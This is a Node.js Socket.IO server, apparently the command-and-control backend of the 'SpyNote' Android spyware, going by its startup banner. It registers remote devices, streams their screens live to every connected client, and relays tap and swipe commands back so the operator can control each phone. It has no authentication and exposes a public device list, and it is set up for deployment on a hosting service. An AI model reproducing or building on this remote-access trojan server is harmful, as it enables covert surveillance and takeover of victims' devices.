const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const compression = require('compression');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingTimeout: 20000,
    pingInterval: 3000,
    maxHttpBufferSize: 200e6
});

// 🔥 STATIC FILES + INDEX.HTM SERVING
app.use(compression());
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json({ limit: '200mb' }));
app.use(express.urlencoded({ limit: '200mb', extended: true }));

// 🔥 ROOT ROUTE - INDEX.HTM LOAD
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// 🔥 ALL ROUTES - SPA
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

const devices = new Map();
const GLOBAL_ROOM = 'all-screens-live';

app.get('/devices', (req, res) => res.json(Array.from(devices.entries())));

io.on('connection', (socket) => {
    console.log(`🔌 ${socket.id.slice(0,8)} CONNECTED`);
    socket.join(GLOBAL_ROOM);
    
    socket.on('register-device', (deviceInfo) => {
        const deviceId = deviceInfo.deviceId;
        devices.set(deviceId, { 
            ...deviceInfo, 
            connected: true, 
            socketId: socket.id, 
            lastSeen: Date.now() 
        });
        socket.join(`device_${deviceId}`);
        console.log(`✅ LIVE: ${deviceId.slice(0,12)} | ${deviceInfo.model}`);
        io.to(GLOBAL_ROOM).emit('devices-update', Array.from(devices.entries()));
    });

    // 🔥 SCREEN + LAYOUT STREAM
    socket.on('screen-frame', (frameData) => {
        const deviceId = frameData.deviceId;
        if (devices.has(deviceId)) {
            devices.set(deviceId, { ...devices.get(deviceId), lastSeen: Date.now() });
            io.to(GLOBAL_ROOM).emit('screen-frame', frameData);
            socket.to(`device_${deviceId}`).emit('screen-frame', frameData);
        }
    });

    // 🔥 REMOTE CONTROL
    socket.on('control', (controlData) => {
        const { deviceId, action, x, y, startX, startY, endX, endY, dx, dy } = controlData;
        if (devices.has(deviceId)) {
            console.log(`🎮 ${action.toUpperCase()} ${deviceId.slice(0,8)} (${x?.toFixed(0)},${y?.toFixed(0)})`);
            socket.to(`device_${deviceId}`).emit('control', controlData);
        }
    });

    socket.on('disconnect', () => {
        for (const [deviceId, info] of devices.entries()) {
            if (info.socketId === socket.id) {
                devices.set(deviceId, { ...info, connected: false });
                io.to(GLOBAL_ROOM).emit('devices-update', Array.from(devices.entries()));
                console.log(`❌ OFFLINE: ${deviceId.slice(0,12)}`);
                break;
            }
        }
    });
});

setInterval(() => {
    const now = Date.now();
    for (const [deviceId, info] of devices.entries()) {
        if (info.connected && (now - info.lastSeen > 45000)) {
            devices.set(deviceId, { ...info, connected: false });
        }
    }
}, 10000);

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`\n🎯 SPYNOTE PRO LIVE! PORT ${PORT}`);
    console.log(`🌐 https://your-app.onrender.com\n`);
});
